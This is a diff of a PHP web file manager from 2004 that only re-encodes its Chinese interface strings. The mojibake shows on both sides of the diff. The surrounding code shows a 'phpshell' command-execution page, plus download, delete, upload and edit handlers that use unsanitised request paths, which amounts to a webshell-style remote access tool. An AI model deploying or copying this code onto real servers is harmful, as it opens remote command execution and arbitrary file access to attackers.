@@ -41,24 +41,24 @@ function get_sub_directory($dir) //get the subdirectories of current directory
 
 ?>
 	<html>
-	<head><title>PHPÎÄ¼ş¹ÜÀí</title>
+	<head><title>PHPæ–‡ä»¶ç®¡ç†</title>
 	<meta http-equiv="content-type" content="text/html; charset='utf-8' ">
 	<link href="file.css" rel="stylesheet" type="text/css">
 	</head>
 	<body>
 	<table border="1" width="250" cellspacing="1" cellpadding="1">
 	  <tr>
-		<td class="t11" height="7" colspan="3">ÎÄ¼ş¹ÜÀíµÇÂ½</td>
+		<td class="t11" height="7" colspan="3">æ–‡ä»¶ç®¡ç†ç™»é™†</td>
 	  </tr>
 	  <tr>
 		<form  method="post" action="">
 		  <td>username
 		  <input type="text" name="name"  />
 		  </td>
-		  <td class="t12" height="9">ÃÜÂë
+		  <td class="t12" height="9">å¯†ç 
 			<input type="password" name="password" maxlength="22" size="17">
 			 </td>
-			 <td><input type="submit" name="pass" value="µÇÂ½"></td>
+			 <td><input type="submit" name="pass" value="ç™»é™†"></td>
 		</form>
 	  </tr>
 	</table>
@@ -69,7 +69,7 @@ if ($_REQUEST["download"]!="")
 {
 		$downfile=$_REQUEST["download"];
 		if (!@is_file($downfile))
-		echo "ÄãÒªÏÂµÄÎÄ¼ş²»´æÔÚ";
+		echo "ä½ è¦ä¸‹çš„æ–‡ä»¶ä¸å­˜åœ¨";
        		 $filename = basename($downfile);
 		$filename_info = explode('.', $filename);
 		$fileext = $filename_info[count($filename_info)-1];
@@ -82,17 +82,17 @@ if ($_REQUEST["download"]!="")
 ?>
 <html>
 <head>
-<title>ÄÚÈİ¹ÜÀíĞ¡³ÌĞò( mlsx 2004-04)</title>
+<title>å†…å®¹ç®¡ç†å°ç¨‹åº( mlsx 2004-04)</title>
 <link href="t.css" rel="stylesheet" type="text/css">
 </head>
 <body>
 <table>
 <tr>
-<td colspan="2"><h1>PHPÎÄ¼ş¹ÜÀí V1.2 (mlsx)</h1></td>
+<td colspan="2"><h1>PHPæ–‡ä»¶ç®¡ç† V1.2 (mlsx)</h1></td>
 </tr>
 <tr>
 <td>
-µ±Ç°Â·¾¶:
+å½“å‰è·¯å¾„:
 <?php
 if (!isset($dir) || $_REQUEST["dir"]=="")
 {
@@ -107,7 +107,7 @@ $dir=$_REQUEST["dir"];
 echo "<a href='?dir=".$dir."' >".$dir."</a>";
 ?>
 </td>
-<td align="right"><a href="?tools=shell_cmd" target="_blank">shellÃüÁî </a></td>
+<td align="right"><a href="?tools=shell_cmd" target="_blank">shellå‘½ä»¤ </a></td>
 </tr>
 </table>
 </body>
@@ -119,17 +119,17 @@ if ($_REQUEST["tools"]=="shell_cmd") //if the user use phpshell
 {
 ?>
 	<html>
-	<head><title>PHPÎÄ¼ş¹ÜÀí V1.2</title>
+	<head><title>PHPæ–‡ä»¶ç®¡ç† V1.2</title>
 	<meta http-equiv="content-type" content="text/html; charset=gb2312">
 	</head>
 	<body>
 	<table border="1" class="t1" width="750" cellspacing="1" cellpadding="1">
 	<form name="" action="" method="post">
 	<tr>
-	<td class="t11">ÃüÁî:
+	<td class="t11">å‘½ä»¤:
 	<input type="text" name="command" size="30">
-	<input type="submit" value="ÔËĞĞ" name="submit">
-	phpshell<a href="javascript:location.reload()">Ë¢ĞÂ</a>
+	<input type="submit" value="è¿è¡Œ" name="submit">
+	phpshell<a href="javascript:location.reload()">åˆ·æ–°</a>
 	</td></tr>
 	<tr><td class="t12">
 	<textarea cols="93" rows="22" readonly name="textarea">
@@ -144,7 +144,7 @@ if ($_REQUEST["tools"]=="shell_cmd") //if the user use phpshell
 } //ending the  phpshell
 ?>
 <?php
-//´¦ÀíÎÄ¼şÉÏ´«
+//å¤„ç†æ–‡ä»¶ä¸Šä¼ 
 if ( isset($_REQUEST["uploadfile"]) and $_REQUEST["uploadfile"]!="" and !isset($_POST["tools"]))
 {
 $path=$_POST["path"];
@@ -181,7 +181,7 @@ for ($i=0; $i< 20; $i++)
 ?>
 
 <?php
-//ÎÄ¼şÉÏ´«
+//æ–‡ä»¶ä¸Šä¼ 
 if ($_REQUEST["editfile"]=="" )
 {
 ?>
@@ -189,7 +189,7 @@ if ($_REQUEST["editfile"]=="" )
 <table border="1">
 <tr>
 <tr>
-<td rowspan="21">ÎÄ¼şÉÏ´«</td>
+<td rowspan="21">æ–‡ä»¶ä¸Šä¼ </td>
 </tr>
 <input type="hidden" name="MAX_FILE_SIZE" value="3000000">
 <tr>
@@ -253,56 +253,56 @@ if ($_REQUEST["editfile"]=="" )
 <td><input type="file" name="file_name[]" /></td>
 </tr>
 <tr>
-<td>Ä¿Ç°Â·¾¶ <input type="text" name="path"  value="./" /></td>
+<td>ç›®å‰è·¯å¾„ <input type="text" name="path"  value="./" /></td>
 </tr>
-<tr><td colspan="2"><input type="submit" name="uploadfile" value="ÉÏ´«"  /></td></tr>
+<tr><td colspan="2"><input type="submit" name="uploadfile" value="ä¸Šä¼ "  /></td></tr>
 </table>
 </form>
 <?php
-}		//ÎÄ¼şÉÏ´«±íµ¥½áÊø
+}		//æ–‡ä»¶ä¸Šä¼ è¡¨å•ç»“æŸ
 ?>
 <?php
-//ÁĞ³öµ±Ç°Ä¿Â¼ÏÂµÄËùÓĞÎÄ¼şºÍÎÄ¼ş¼Ğ
+//åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹
 if ($_REQUEST["dir"]!="" || $_SERVER["QUERY_STRING"]=="")
 {
 	$dir=stripslashes($_REQUEST["dir"]);
 	echo "current dir is ".$dir ."<br/>";
-	if ($dir=="")		//Ô­À´ÎÒ¾ÓÈ»¼ÓÁËÒ»¸ö·ÖºÅ,ÄÑ¹ÖÒ»Ö±²»ÄÜÔËĞĞ
+	if ($dir=="")		//åŸæ¥æˆ‘å±…ç„¶åŠ äº†ä¸€ä¸ªåˆ†å·,éš¾æ€ªä¸€ç›´ä¸èƒ½è¿è¡Œ
 	$dir=str_replace('','/',dirname(__FILE__));
 	$found_dir=get_sub_directory($dir);
 	$found_file=get_directory_file($dir);
 	echo "<table border='1'><tr><td>";
 		//list all subdirectories;
 		echo "<table>";
-		echo "<tr><td>Ä¿Â¼Ãû</td><td>ÊôĞÔ</td><td>²Ù×÷</td></tr>";
+		echo "<tr><td>ç›®å½•å</td><td>å±æ€§</td><td>æ“ä½œ</td></tr>";
 		echo "<tr><td><a href='?dir=".$dir."/./' >.</a></td><td>0777</td><td></td></tr>";
 		echo "<tr><td><a href='?dir=".$dir."/../' >..</a></td><td>0777</td><td></td></tr>";
 		foreach($found_dir as $key=> $value)
 		{
 			$property=substr(base_convert(fileperms($dir."/".$value),10,8),-4);
-			echo "<tr><td><a href='?dir=".$dir."/".$value."'>".$value." </a></td><td>$property</td><td>É¾³ı</td></tr>";
+			echo "<tr><td><a href='?dir=".$dir."/".$value."'>".$value." </a></td><td>$property</td><td>åˆ é™¤</td></tr>";
 		}
 		echo "</table>";
 	echo "</td>";
 	echo "<td>";
 		//list all file at current directory;
 		echo "<table>";
-		echo "<tr><td>ÎÄ¼şÃû</td><td>ÎÄ¼şÊôĞÔ</td><td colspan='3'>ÎÄ¼ş²Ù×÷</td></tr>";
+		echo "<tr><td>æ–‡ä»¶å</td><td>æ–‡ä»¶å±æ€§</td><td colspan='3'>æ–‡ä»¶æ“ä½œ</td></tr>";
 		foreach($found_file as $key=> $value)
 		{
 			$property=substr(base_convert(fileperms($dir."/".$value),10,8),-4);
 			echo "<tr><td>".$value."</td><td>".$property."</td><td>";
-			echo "<a href='?download=".$dir."/".$value."' >ÏÂÔØ</a></td><td><a href=?delfile=";
-			echo $dir."/".$value.">É¾³ı</a></td>";
-			echo "<td><a href='?edit=1&&editfile=".$dir."/".$value." ' target='_blank'>±à¼­</a></td></tr>";
+			echo "<a href='?download=".$dir."/".$value."' >ä¸‹è½½</a></td><td><a href=?delfile=";
+			echo $dir."/".$value.">åˆ é™¤</a></td>";
+			echo "<td><a href='?edit=1&&editfile=".$dir."/".$value." ' target='_blank'>ç¼–è¾‘</a></td></tr>";
 		}
 		echo "</table>";
 	echo "</td>";
 	echo "</tr></table>";
-} //½áÊøÎÄ¼şÁĞ±í
+} //ç»“æŸæ–‡ä»¶åˆ—è¡¨
 ?>
 <?php
-//±à¼­ÎÄ¼ş
+//ç¼–è¾‘æ–‡ä»¶
 if ($_REQUEST["edit"]==1 and $_REQUEST["editfile"]!="")
 {
 	$editfile=$_REQUEST["editfile"];
@@ -317,7 +317,7 @@ if ($_REQUEST["edit"]==1 and $_REQUEST["editfile"]!="")
 	<td><input type="hidden" name="editfile" value="<?php echo $editfile; ?>" /></td>
 	</tr>
 	<tr>
-	<td>±à¼­µÄÎÄ¼şÃû³Æ <input type="text" value="<?php echo $filename ?>"  name="filename" /></td>
+	<td>ç¼–è¾‘çš„æ–‡ä»¶åç§° <input type="text" value="<?php echo $filename ?>"  name="filename" /></td>
 	</tr>
 	<tr>
 	<td >
@@ -330,14 +330,14 @@ if ($_REQUEST["edit"]==1 and $_REQUEST["editfile"]!="")
 	</td>
 	</tr>
 	<tr>
-	<td><input type="submit" value="Ìá½»" name="editover" /></td>
+	<td><input type="submit" value="æäº¤" name="editover" /></td>
 	</tr>
 	</table>
 	</form>
 <?php
 if ($_REQUEST["editover"]!="" and $_REQUEST["file_content"]!="")
 {
-	//¿ªÊ¼´¦ÀíÎÄ¼ş±à¼­µÄÌá½»
+	//å¼€å§‹å¤„ç†æ–‡ä»¶ç¼–è¾‘çš„æäº¤
 	$editfile=$_REQUEST["editfile"];
 	$content=stripcslashes($_REQUEST["file_content"]); //un-single quota symbol
 	//$length=strlen($content);
